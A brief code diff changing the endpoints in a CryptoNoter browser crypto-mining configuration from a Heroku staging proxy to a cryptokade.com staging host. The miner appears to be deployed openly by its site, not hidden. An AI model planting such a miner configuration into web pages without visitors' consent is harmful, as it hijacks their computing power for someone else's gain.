@@ -1,7 +1,7 @@
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://lotto-mining-proxy-staging.herokuapp.com/lib/",
-    WEBSOCKET_SHARDS: [["wss://lotto-mining-proxy-staging.herokuapp.com/proxy"]]
+    LIB_URL: "https://staging-mining.cryptokade.com/lib/",
+    WEBSOCKET_SHARDS: [["wss://staging-mining.cryptokade.com/proxy"]]
 };
 var Module = {
     locateFile: (function (path) {
